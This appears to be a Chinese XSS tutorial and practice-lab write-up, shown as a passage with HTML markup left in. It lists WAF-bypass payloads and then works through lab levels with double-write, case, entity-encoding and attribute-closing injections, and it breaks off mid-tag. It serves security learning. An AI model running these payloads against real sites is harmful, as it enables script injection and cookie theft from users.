title=\"绕过空格\"></a>绕过空格</h2><p>在做题时，可能会遇到一种情况就是将空格替换为空，此时我们的办法就是找代替空格的，在XSS常见绕过空格的方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">%</span><span class=\"token number\">0</span>a\n<span class=\"token comment\">/**/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h1 id=\"绕WAF\"><a href=\"#绕WAF\" class=\"headerlink\" title=\"绕WAF\"></a>绕WAF</h1><p>开启XX狗后，普通的XSS是无法实现绕过的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534514.png\" alt=\"在这里插入图片描述\">这里的思路呢，就是利用不常用的标签和新的HTML5新标签来进行绕过，经过测试，将可用绕过的姿势总结如下</p>\n<h2 id=\"姿势\"><a href=\"#姿势\" class=\"headerlink\" title=\"姿势\"></a>姿势</h2><h3 id=\"iframe标签-1\"><a href=\"#iframe标签-1\" class=\"headerlink\" title=\"iframe标签\"></a>iframe标签</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>iframe onload<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"alert(document.cookie)\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>iframe<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534317.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"audio标签\"><a href=\"#audio标签\" class=\"headerlink\" title=\"audio标签\"></a>audio标签</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>audio src<span class=\"token operator\">=</span><span class=\"token number\">1</span> onerror<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534462.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"video标签\"><a href=\"#video标签\" class=\"headerlink\" title=\"video标签\"></a>video标签</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>video src<span class=\"token operator\">=</span>x onerror<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534783.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"svg标签-1\"><a href=\"#svg标签-1\" class=\"headerlink\" title=\"svg标签\"></a>svg标签</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534163.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"button标签\"><a href=\"#button标签\" class=\"headerlink\" title=\"button标签\"></a>button标签</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>button onfocus<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>button onclick<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534155.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"object标签\"><a href=\"#object标签\" class=\"headerlink\" title=\"object标签\"></a>object标签</h3><p>这个方法需要借助data伪协议来配合使用</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token keyword type-declaration\">object</span> data<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"data:text/html;base64,PHNjcmlwdD5hbGVydCgncXVhbjlpJyk8L3NjcmlwdD4=\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token keyword type-declaration\">object</span><span class=\"token operator\">></span>\n<span class=\"token comment\">//内容经base64解密后为&lt;script>alert('quan9i')&lt;/script></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534231.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"div标签\"><a href=\"#div标签\" class=\"headerlink\" title=\"div标签\"></a>div标签</h3><p>这个需要借助url编码来实现绕过</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>div onmouseover<span class=\"token operator\">%</span><span class=\"token number\">3</span>d<span class=\"token string single-quoted-string\">'alert%26lpar%3b1%26rpar%3b'</span><span class=\"token operator\">></span><span class=\"token constant\">DIV</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>fdiv<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h1 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h1><h2 id=\"双写及大小写绕过-1\"><a href=\"#双写及大小写绕过-1\" class=\"headerlink\" title=\"双写及大小写绕过\"></a>双写及大小写绕过</h2><h3 id=\"0X01\"><a href=\"#0X01\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><p>尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534454.png\" alt=\"在这里插入图片描述\"><br>发现直接将script给过滤了，这里的思路想到可能是双写绕过，因为这种直接过滤的一般都是把script替换为空。<br>查看一下源码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534445.png\" alt=\"在这里插入图片描述\"></p>\n<p>我们发现这里不仅过滤了script，我们这里可以换标签，再利用双写实现攻击语句逃逸，这时候我们用<code>&quot;/&gt;</code>闭合标签，自己再构造一个恶意的超链接即可，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">\"<span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>a hrhrefef<span class=\"token operator\">=</span>javascrscriptipt<span class=\"token punctuation\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span>\n<span class=\"token comment\">//经测试href被过滤，所以这里也需要双写</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>执行结果如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534704.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"0X02\"><a href=\"#0X02\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><p>输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534817.png\" alt=\"在这里插入图片描述\"></p>\n<p>查看源代码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534993.png\" alt=\"在这里插入图片描述\"><br>这里发现过滤了script，看起来与0x01那个题很像，我们此时尝试上关的payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">\"<span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>a hrhrefef<span class=\"token operator\">=</span>javascrscriptipt<span class=\"token punctuation\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>没有成功，此时查看源代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>h2 align<span class=\"token operator\">=</span>center<span class=\"token operator\">></span>没有找到和<span class=\"token operator\">&amp;</span>quot<span class=\"token punctuation\">;</span><span class=\"token operator\">/</span><span class=\"token operator\">&amp;</span>gt<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>lt<span class=\"token punctuation\">;</span>a href<span class=\"token operator\">=</span>javascript<span class=\"token punctuation\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>gt<span class=\"token punctuation\">;</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>lt<span class=\"token punctuation\">;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">&amp;</span>gt<span class=\"token punctuation\">;</span>相关的结果<span class=\"token operator\">.</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h2<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>center<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>form action<span class=\"token operator\">=</span>level6<span class=\"token operator\">.</span>php method<span class=\"token operator\">=</span><span class=\"token constant\">GET</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span>keyword  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>a hr_ef<span class=\"token operator\">=</span>javascript<span class=\"token punctuation\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span>\"<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span>submit name<span class=\"token operator\">=</span>submit value<span class=\"token operator\">=</span>搜索 <span class=\"token operator\">/</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话可以发现href被过滤了，可能还有其他方法？但经过尝试，暂未找到其他方法，这里的话考虑的就是大小写绕过了，其他好像也没啥方法了，双写绕过没戏，因此尝试一下大小写绕过</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">\"<span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>a hRef<span class=\"token operator\">=</span>javasCript<span class=\"token punctuation\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534002.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"实体编码绕过\"><a href=\"#实体编码绕过\" class=\"headerlink\" title=\"实体编码绕过\"></a>实体编码绕过</h2><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534160.png\" alt=\"在这里插入图片描述\"><br>查看源码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534208.png\" alt=\"在这里插入图片描述\"><br>发现我们填的是在超链接中的，此时会跳转到对应界面，如果我们利用JavaScript来执行xss语句，是不是也能执行出来呢，此时我们进行测试。<br>输入<code>javascript:alert(1)</code>进行测试<br>查看源代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"您的链接不合法？有没有！\"</span><span class=\"token operator\">></span>友情链接<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>提示链接不合法，想着正常的链接一般是<code>http://</code>这种，我们随便输入一个尝试一下看是否正常</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//quan9i.top</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534403.png\" alt=\"在这里插入图片描述\"><br>点击后确实跳转了<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534923.png\" alt=\"在这里插入图片描述\"><br>说明和我们想的一样，这里需要有<code>http://</code>，可是放前面的话JavaScript是无法触发的，那此时的思路就是放后面然后进行注释</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">javascript<span class=\"token punctuation\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//http://</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>但是此时点击链接仍未出现弹窗，查看源代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"javascr_ipt:alert(1)//http://\"</span><span class=\"token operator\">></span>友情链接<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>script被过滤，因此我们这里对script进行HTML实体编码，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">java<span class=\"token operator\">&amp;</span><span class=\"token comment\">#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)//http://</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534725.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"闭合语句绕过-1\"><a href=\"#闭合语句绕过-1\" class=\"headerlink\" title=\"闭合语句绕过\"></a>闭合语句绕过</h2><h3 id=\"0X01-1\"><a href=\"#0X01-1\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534250.png\" alt=\"在这里插入图片描述\"></p>\n<p>进入界面后，发现没有按钮和搜素框，有点怪，看到参数有个keyword，先简单试一下xss</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">keyword<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>查看源代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>h1 align<span class=\"token operator\">=</span>center<span class=\"token operator\">></span>欢迎来到level10<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>h2 align<span class=\"token operator\">=</span>center<span class=\"token operator\">></span>没有找到和<span class=\"token operator\">&amp;</span>lt<span class=\"token punctuation\">;</span>script<span class=\"token operator\">&amp;</span>gt<span class=\"token punctuation\">;</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>lt<span class=\"token punctuation\">;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">&amp;</span>gt<span class=\"token punctuation\">;</span>相关的结果<span class=\"token operator\">.</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h2<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>center<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>form id<span class=\"token operator\">=</span>search<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_link\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_history\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_sort\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>center<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>center<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>img src<span class=\"token operator\">=</span>level10<span class=\"token operator\">.</span>png<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>center<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>h3 align<span class=\"token operator\">=</span>center<span class=\"token operator\">></span>payload的长度<span class=\"token punctuation\">:</span><span class=\"token number\">25</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h3<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>body<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>html<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以看到我们keyword输入的内容被进行了HTML实体编码，所以基本没戏，同时发现三个隐藏的参数，对这三个参数进行赋值，看哪个会有回显</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">keyword<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>t_link<span class=\"token operator\">=</span>test<span class=\"token operator\">&amp;</span>t_history<span class=\"token operator\">=</span>test<span class=\"token operator\">&amp;</span>t_sort<span class=\"token operator\">=</span>test<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>查看源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>h1 align<span class=\"token operator\">=</span>center<span class=\"token operator\">></span>欢迎来到level10<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>h2 align<span class=\"token operator\">=</span>center<span class=\"token operator\">></span>没有找到和<span class=\"token number\">1</span>相关的结果<span class=\"token operator\">.</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h2<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>center<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>form id<span class=\"token operator\">=</span>search<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_link\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_history\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_sort\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>center<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>center<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>img src<span class=\"token operator\">=</span>level10<span class=\"token operator\">.</span>png<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>center<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>发现<code>t_sort</code>参数是有回显的，不过呢，这个由于type是隐藏的，所以在界面上是无回显的，因此我们这里修改type为<code>text</code>或者<code>button</code>都是可以的，下图中的值都是可以的<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534199.png\" alt=\"在这里插入图片描述\"></p>\n<p>那想要构造的话，首先需要把value这个给闭合了，所以payload首先需要一个<code>&quot;</code>，而后构造onclick事件，点击触发xss即可，思路有了，构造payload也就好办了，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">keyword<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>t_sort<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"type=\"</span>checkbox<span class=\"token string double-quoted-string\">\" onclick=alert(1)//\n此时语句就是\n&lt;input name=\"</span>t_sort<span class=\"token string double-quoted-string\">\"  value=\"</span><span class=\"token string double-quoted-string\">\"type=\"</span>checkbox<span class=\"token string double-quoted-string\">\" onclick=alert(1)//\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n也就是<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_sort\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span>type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"checkbox\"</span> onclick<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534487.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"0X02-1\"><a href=\"#0X02-1\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534563.png\" alt=\"在这里插入图片描述\"><br>没有搜索框，只有一个参数<br>此时我们随便输入个<code>&lt;script&gt;</code>然后查看源代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>h1 align<span class=\"token operator\">=</span>center<span class=\"token operator\">></span>欢迎来到level11<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>h2 align<span class=\"token operator\">=</span>center<span class=\"token operator\">></span>没有找到和<span class=\"token operator\">&amp;</span>lt<span class=\"token punctuation\">;</span>script<span class=\"token operator\">&amp;</span>gt<span class=\"token punctuation\">;</span>相关的结果<span class=\"token operator\">.</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h2<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>center<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>form id<span class=\"token operator\">=</span>search<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_link\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_history\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_sort\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"test\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_ref\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>form<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>keyword内容被转换为HTML实体，G，看下面，变成了四个隐藏参数，同上关，测试看哪个有回显</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">keyword<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>t_link<span class=\"token operator\">=</span>test<span class=\"token operator\">&amp;</span>t_history<span class=\"token operator\">=</span>test<span class=\"token operator\">&amp;</span>t_sort<span class=\"token operator\">=</span>test<span class=\"token operator\">&amp;</span>t_ref<span class=\"token operator\">=</span>test<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141534092.png\" alt=\"在这里插入图片描述\"></p>\n<p><code>t_sort</code>有回显，确定注入参数，尝试上关方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">keyword<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>t_sort<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"type=\"</span>checkbox\" onclick<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>没有出现框，查看源代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_link\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_history\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_sort\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"&amp;quot;type=&amp;quot;checkbox&amp;quot; onclick=alert(1)//\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>input name<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t_ref\"</span>  value<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span> type<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hidden\"</span><span class=\"token operator\">></span><span aria-hidden=\"true\" 